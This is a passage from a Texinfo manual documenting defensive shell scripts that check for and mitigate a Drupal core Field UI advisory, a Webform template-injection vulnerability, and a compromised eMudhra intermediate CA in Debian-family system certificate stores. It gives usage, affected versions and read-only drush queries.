                   published workaround for CVE-2026-108097: uninstalls the Field UI
                   module with drush (pm:uninstall field_ui) on every site whose core is
                   affected and where the LIVE site (not only exported configuration)
                   still has it enabled. drush runs as the owner of the site, never as
                   root, and is looked up in the project's vendor/bin, then PATH. The
                   field management screens are unavailable until you reinstall Field UI.
                   It covers this advisory only: the same release fixes two other core
                   issues, so update core as well. --force uninstalls on a core that is
                   not in the affected range.
  rollback [--dry-run]   reinstall Field UI (pm:install field_ui) on the sites mitigate changed.
  version          print the script version.

Configuration kept only in the database is not visible to a file scan. On a
live site, run in the Drupal root:
  drush pm:list --status=enabled --type=module --format=list | grep -x field_ui
Containers: with no directory argument the check also copies the files it reads from running
docker and podman containers (SCAN_CONTAINERS=1, the default; 0 skips them) and judges them like
host installs. The copies are temporary: a path shown as .../docker_NAME_PATH is the PATH inside
the container NAME.
@end example
The script is /opt/psf-security-patches/drupal/drupal-core-check.sh. Manual page: psf-drupal-core-check(8).
@node psf-drupal-webform-check
@section psf-drupal-webform-check
Drupal Webform remote code execution: read-only checker
@example
Drupal Webform remote code execution: read-only checker  (v1)
CVE-2026-96355 (SA-CONTRIB-2026-175)

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

The Drupal Webform module does not sufficiently exclude certain format
templates from token replacement. An attacker can submit data that is then
evaluated as template code when a submission is rendered. Depending on site
configuration and enabled modules this can mean information disclosure,
stored cross-site scripting or remote code execution. Drupal Security Team
rating: Critical, 18/25.

  Affected: Webform before 6.2.12, and 6.3.0 before 6.3.1
  Fixed:    6.2.12 on the 6.2.x branch, 6.3.1 on the 6.3.x branch
  Condition (from the advisory): an affected webform must define a custom
  multiple-value item format that includes submission-value tokens. Some
  impacts also depend on other enabled modules. Drupal core is not affected.

Webform is among the most widely installed Drupal modules and sits on public
pages. The same releases close 19 other Webform advisories published on the
same day (numbered between SA-CONTRIB-2026-154 and 174).

This script is read-only. It reads the Webform version from composer.lock and
from the module's own webform.info.yml, and scans exported configuration for
webforms that use a custom multiple-value format.

Usage:
  ./drupal-webform-check.sh [command] [DIR ...]

  check (default)  scan DIR (default /var/www /srv /opt /home) for Webform.
                   Exit 0 = nothing affected, 1 = an affected version found.
  version          print the script version.

Configuration stored only in the database is not visible to a file scan. To
list webforms with a custom multiple-value format from the live site, run in
the Drupal root:
  drush config:list --prefix=webform.webform. --format=list | while read -r c; do
    drush config:get "$c" elements 2>/dev/null | grep -E "format_items.*custom" >/dev/null && echo "$c"; done
Containers: with no directory argument the check also copies the files it reads from running
docker and podman containers (SCAN_CONTAINERS=1, the default; 0 skips them) and judges them like
host installs. The copies are temporary: a path shown as .../docker_NAME_PATH is the PATH inside
the container NAME.
@end example
The script is /opt/psf-security-patches/drupal/drupal-webform-check.sh. Manual page: psf-drupal-webform-check(8).
@node psf-emudhra-mitigate
@section psf-emudhra-mitigate
eMudhra intermediate CA compromise, mitigation
@example
eMudhra intermediate CA compromise, mitigation  (v1)
Disclosed 20 Oct 2026: https://emudhra.we-have-a-problem.com/

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

The private keys of eight eMudhra intermediate CAs can be recovered from
their certificates. Browsers block them through OneCRL, CRLite and CRLSets,
but the system CA store, and everything that reads it (OpenSSL, GnuTLS, curl,
wget, apt, git, Python, PHP, Go, Ruby, Java via ca-certificates-java), keeps
trusting them until ca-certificates is updated. This script distrusts the
roots that anchor them and then proves the store rejects all of them.

Usage:
  ./emudhra-mitigate.sh [command] [--force] [--ignore-env]

  check            environment report only; changes nothing, root optional
                   (exit 0 = ok, 1 = hard blocker, 2 = needs --ignore-env)
  apply (default)  distrust the affected certificates in the system store,
                   rebuild it, fix the Java keystore, and verify
  status           mitigation state, store tests and stale processes
  restore          undo everything this script distrusted (re-exposes you
                   if ca-certificates isn't patched)
  cleanup          once ca-certificates is patched: remove this script's
                   distrust, but only if the store still rejects every
                   compromised intermediate afterwards (--force skips the
                   patch check, never the store test)
  version          print the script version and exit

  --ignore-env     proceed past soft environment blockers (a running
                   process or system-wide override uses a CA store this run
                   can't fix). Hard blockers (non-Debian, no
                   update-ca-certificates, no openssl, not root) can't be
                   overridden.

Every command first checks, in order: OS (Debian, Ubuntu, Trisquel and
popular derivatives), the system CA store and its package, other CA stores
(Java, Python certifi and other bundles, Node.js, NSS, overrides), then system
(root, container, tools). The system store's patch state is reported from
three signals: the fixed build for your release, extra FIXED_BUILDS, and the
package changelog. The verdict that matters is functional: every command
tests each store against the 16 published intermediate certificates, which
are embedded below and checked against their published SHA-256 fingerprints.

Env overrides:
  FIXED_BUILDS="20250419~deb12u2"   extra fixed ca-certificates builds
  SCAN_PATHS="/opt /srv ..."         where to look for bundled CA files;
                                     empty disables the scan
  SCAN_DEPTH=9                       find -maxdepth for that scan
